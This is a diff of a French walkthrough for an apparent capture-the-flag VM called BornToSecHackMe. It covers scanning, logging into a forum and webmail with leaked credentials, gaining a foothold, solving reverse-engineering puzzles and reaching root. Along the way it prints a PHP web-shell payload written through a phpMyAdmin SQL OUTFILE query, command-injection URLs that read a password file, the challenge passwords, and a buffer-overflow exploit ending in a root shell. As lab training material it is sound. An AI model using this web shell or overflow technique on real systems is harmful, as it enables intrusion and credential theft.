@@ -13,7 +13,8 @@ On remarque que dans les configs de la VM, on a l'adresse MAC (Réseau->avancé)
 ```bash
 arp-scan -l
 ```
- va afficher :      (pour Marie : sudo arp-scan --interface=en0 --localnet)
+
+va afficher : (pour Marie : sudo arp-scan --interface=en0 --localnet)
 
             Interface: en0, type: EN10MB, MAC: f0:18:98:5c:ac:dd, IPv4: 192.168.0.19
             Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -24,12 +25,14 @@ arp-scan -l
             530 packets received by filter, 0 packets dropped by kernel
             Ending arp-scan 1.9.7: 256 hosts scanned in 1.870 seconds (136.90 hosts/sec). 3 responded
 
-On regarde ensuite quels ports sont ouverts avec : 
+On regarde ensuite quels ports sont ouverts avec :
+
 ```bash
 nmap -v -A [IP]
 ```
 
 On voit que les ports suivants sont présents :
+
 ```bash
 22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
 80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
@@ -49,6 +52,7 @@ https://blog.sec-it.fr/en/2021/02/16/fuzz-dir-tools/
 Le premier proposé est dirb
 
 Effectivement après installation avec :
+
 ```bash
             cd ~/Applications
             wget https://downloads.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
@@ -69,6 +73,7 @@ dirb http://192.168.0.30/ wordlists/common.txt
 ```
 
 On obtient alors :
+
 ```bash
             GENERATED WORDS: 4612
 
@@ -83,15 +88,17 @@ On obtient alors :
             (!) WARNING: Directory IS LISTABLE. No need to scan it.
                 (Use mode '-w' if you want to scan it anyway)
 ```
+
 Dirb a scanné le site et a trouvé des répertoires cachés, le seul auquel nous avons accès actuellement est http://192.168.0.30/forum
 /!\ il faut passer le site en httpS !
 
 ## Le Forum
 
 Quand on se connecte sur le forum, on peut voir différents sujets inutiles, et un très intéressant :
-            Probleme login ? 
+Probleme login ?
 
 Quand on l'ouvre on se rend compte que ce sont des retours de commandes, parmi ceux-ci se trouve :
+
 ```bash
             Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
             Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
@@ -99,14 +106,15 @@ Quand on l'ouvre on se rend compte que ce sont des retours de commandes, parmi c
 ```
 
 on essaye donc de se connecter sur la VM mais ça ne marche pas, on essaye donc de se connecter simplement au forum :
-```bash
+
+````bash
             Id = lmezard
             mdp = !q\]Ej?*5K5cy*AJ    (la personne s'est sûrement trompée et a rentré son mot de passe en login)
 
-Ca marche ! On arrive alors sur sa page profil et on obtient son adresse email = 
-```bash 
+Ca marche ! On arrive alors sur sa page profil et on obtient son adresse email =
+```bash
 laurie@borntosec.net
-```
+````
 
 On ne sait pas trop quoi faire de plus, on voit bien un espace Users et contact mais rien de croustillant
 
@@ -140,15 +148,19 @@ dirb https://192.168.0.30/ wordlists/common.txt
             ==> DIRECTORY: https://192.168.0.30/forum/themes/
             ==> DIRECTORY: https://192.168.0.30/forum/update/
 ```
+
 On essaye d'aller sur https://192.168.0.30/webmail/
 
 On obtient une page login, on peut se connecter avec les identifiants de Laurie :
+
 ```bash
 Id : laurie@borntosec.net
 Mot de passe : !q\]Ej?*5K5cy*AJ
 ```
+
 On tombe sur sa boite mail avec deux mails :
 L'un d'entre eux est : DB Access et contient :
+
 ```bash
             Hey Laurie,
 
@@ -167,35 +179,43 @@ En se connectant sur phpmyadmin en tant que root, on peut utiliser la fenetre de
 Quand on regarde la structure de mylittleforum, il y a un dossier templates_c. Quand on navigue dessus, on voit plusieurs fichiers php sur lesquels on peut naviguer.
 Si on arrive a creer une page php ici on pourra lui faire executer des commandes.
 Dans la fenetre de commandes SQL on lance :
+
 ```bash
 SELECT "<?php system($GET_['exploit']) ?>" INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
 ```
+
 Cela cree le ficher exploit.php sur lequel on peut naviguer et auquel on peut passer des commandes dans l'URL
 
 En fouillant dans le serveur, on fini par tomber sur :
+
 ```bash
 https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home
 LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
 https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home/LOOKATME
-password 
+password
 https://192.168.56.3/forum/templates_c/exploit.php?exploit=cat%20/home/LOOKATME/password
-lmezard:G!@M6f4Eatau{sF" 
+lmezard:G!@M6f4Eatau{sF"
 ```
 
 Avec cet identifiant et ce mot de passe, on peut se connecter sur la VM
 Dans le home de lmezard, il y a un fichier `fun` et un ficher `README` qui nous challenge a trouver la solution du probleme.
 
 Le fichier fun comporte des strings, des noms de fichiers, etc. La string ustar revient souvent, et on en deduit que le fichier est un fichier tar.
+
 ```bash
 `tar -C /tmp -xvf fun`
 ```
+
 Et on obtient plein de fichiers. Certains comportent des strings interessantes : "getme()". On trouve :
+
 ```bash
             grep -A2 getme /tmp/ft_fun/*
 ```
+
 les fonctions getme retournent un caractere qui est ensuite print et pour lequel on nous dit d'utiliser SHA-256
 Certaines fonctions sont sur plusieurs fichiers, et dans ce cas il faut se ficher au numero de fichier inclu dans le contenu du fichier et regarder le ficher suivant.
-On obtient : 
+On obtient :
+
 ```bash
 Iheartpwnage => 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
@@ -211,49 +231,68 @@ Après avoir testé différentes méthodes, on a retenu Ghidra :
 On récupère le fichier avec scp -P 22 laurie@192.168.0.30:bomb .
 
 Les réponses aux 6 phases sont :
+
 ### Phase 1
-Phase 1 : 
+
+Phase 1 :
+
 ```bash
 Public speaking is very easy.
 ```
+
 Note : on le trouve directement en faisant un string ou dans ghidra fonction Phase_1 avec le compare
 
 ### Phase 2
-Phase 2 : 
+
+Phase 2 :
+
 ```bash
 1 2 6 24 120 720
 ```
-Note : on a fait le calcul u[i] = i x u[i - 1]  avec u[0] = 1
+
+Note : on a fait le calcul u[i] = i x u[i - 1] avec u[0] = 1
 
 ### Phase 3
-Phase 3 : 
+
+Phase 3 :
+
 ```bash
 1 b 214
 ```
+
 On sait que le milieu = b (indice) donc on essaye de trouver le premier chiffre qui correspondrait et on en deduit le dernier (ex avec les cases)
 
 ### Phase 4
-Phase 4 : 
+
+Phase 4 :
+
 ```bash
 9
 ```
+
 Il fallait que ce soit égale à 55 donc on a fait un petit programme qui nous ressortira la valeur qui correspond (cf Phase_4_bomb.c)
 
 ### Phase 5
-Phase 5 : 
+
+Phase 5 :
+
 ```bash
 opekmq
 ```
+
 En examinant la fonction on voit qu'il y a une recursive appliquée à la string entrée et qui la modifie
 On cherche la string qui apres modification sera égale à giants
 Le programme fait l'équivalence entre toutes les lettres
 (cf Phase_5_bomb.c)
 
 ### Phase 6
-Phase 6 : 
+
+Phase 6 :
+
 ```bash
 4 2 6 3 1 5
 ```
+
 On comprend qu'il doit y avoir 6 nombres et que ces 6 nombres sont compris entre 1 et 6 et sont uniques. L'indice nous indique que le premier nombre est 4.
 
 En cherchant la valeur de node1 on se rend compte qu'il y a aussi node2, node3 etc.. et qu'ils sont comme chainés.
@@ -261,6 +300,7 @@ on prend alors la valeur de node1 qui est en hexa et on la convertie en decimal
 https://decimal-to-binary.com/decimal-to-binary-converter-online.html
 
 On obtient pour chaque :
+
 ```bash
 node : hexa : decimal
 1 : 000000fd : 253
@@ -273,25 +313,29 @@ node : hexa : decimal
 
 On voit alors que n+1 doit etre inferieur à n donc ça donne 4 2 6 3 1 5 (DESC)
 
-
 ### Defused ?
+
 La bomb est defused mais quand on tape le mdp pour Thor ça ne fonctionne pas :
+
 ```bash
 Publicspeakingisveryeasy.126241207201b2149opekmq426315
 ```
 
-Sur le slack, il est dit qu'il faut inverser 2 caracteres, donc en bruteforcant un peu on obtient le vrai mot de passe : 
+Sur le slack, il est dit qu'il faut inverser 2 caracteres, donc en bruteforcant un peu on obtient le vrai mot de passe :
+
 ```bash
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
 on peut donc se connecter
+
 ```bash
 ssh thor@192.168.0.30 -p 22
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
 ## Thor
+
 Une fois connecté, le README demande juste de résoudre l'exo et de s'en servir comme mdp pour zaz
 Quand on cat on obtient un long texte avec à la fin "Can you digest the message? :)"
 
@@ -301,12 +345,14 @@ Samy nous a donc fait un super algo pour nous l'afficher ! (cf turtle_Samy.py)
 
 On obtient SLASH
 
-Le mot de passe ne passe pas pour zaz, on cherche donc digest message sur Google et on tombe sur... MD5 ! 
+Le mot de passe ne passe pas pour zaz, on cherche donc digest message sur Google et on tombe sur... MD5 !
 
 On fait donc le md5 de SLASH et on obtient : 646da671ca01bb5d84dbb5fb2238dc8e
 
 ## Zaz
+
 On se connecte :
+
 ```bash
 ssh zaz@192.168.0.30 -p 22
 646da671ca01bb5d84dbb5fb2238dc8e
@@ -314,6 +360,7 @@ ssh zaz@192.168.0.30 -p 22
 
 On suit le tutoriel de :
 https://beta.hackndo.com/retour-a-la-libc/
+
 ```bash
             (gdb) r $(perl -e 'print "A"x140 . "\xef\xbe\xad\xde"')
                 Starting program: /home/zaz/exploit_me $(perl -e 'print "A"x200 . "\xef\xbe\xad\xde"')
@@ -381,4 +428,5 @@ https://beta.hackndo.com/retour-a-la-libc/
             # whoami
                 root
 ```
+
 ## We did it !
